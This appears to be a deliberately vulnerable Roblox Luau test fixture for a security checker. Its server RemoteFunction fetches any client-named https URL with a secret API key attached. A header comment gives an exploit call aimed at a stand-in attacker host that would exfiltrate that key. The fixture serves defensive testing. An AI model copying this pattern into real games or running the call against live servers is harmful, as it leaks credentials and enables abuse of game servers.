--!strict
-- Vulnerable: a generic "fetch" proxy. LocalScripts cannot use HttpService,
-- so the menu asks the server to download its content (patch notes, event
-- banners) through a RemoteFunction. The server fetches whatever URL the
-- client names, with the content API key attached. The only check is a
-- prefix pattern, which says nothing about the host or the path.
--
-- Exploit: FetchContent:InvokeServer("https://attacker.example/collect")
-- makes the game server send its X-Api-Key header to the exploiter's own
-- server. The remote also turns every game server into a free anonymous
-- proxy, and a few players invoking it in a loop burn the server's
-- HttpService budget, breaking every other HTTP feature of the game.

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local FetchContent = ReplicatedStorage.Remotes.FetchContent :: RemoteFunction

local CONTENT_KEY = HttpService:GetSecret("content_api_key")
local FETCH_COOLDOWN = 3

local lastFetch: { [Player]: number } = {}

FetchContent.OnServerInvoke = function(player: Player, url: string): string?
	local now = os.clock()
	if now - (lastFetch[player] or 0) < FETCH_COOLDOWN then
		return nil
	end
	lastFetch[player] = now

	-- Anchored at the start only: "https://anything/at/all" passes.
	if typeof(url) ~= "string" or not url:match("^https://") then
		return nil
	end

	local ok, body = pcall(function()
		return HttpService:GetAsync(url, false, { ["X-Api-Key"] = CONTENT_KEY }) -- expect: luau-shield005
	end)
	return if ok then body else nil
end
